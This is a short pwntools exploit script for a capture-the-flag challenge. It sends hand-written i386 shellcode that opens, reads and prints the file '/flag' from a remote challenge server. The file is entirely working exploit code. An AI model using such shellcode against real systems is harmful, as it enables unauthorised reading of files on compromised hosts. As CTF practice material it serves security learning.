#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

p = remote("ctf.racterub.me", 3002)
p.recvuntil(":")
context.arch = "i386"



shellcode = asm("""
        jmp hello
    write :
        pop ebx
        mov eax,5
        mov ecx,0
        int 0x80

        mov ebx,eax
        mov ecx,esp
        mov edx,0x60
        mov eax,3
        int 0x80

        mov edx,eax
        mov ebx,1
        mov eax,4
        int 0x80
    
        mov eax,1
        xor ebx,ebx
        int 0x80
    hello :
        call write
        .ascii "/flag"
        .byte 0
""")

p.sendline(shellcode)
p.interactive()
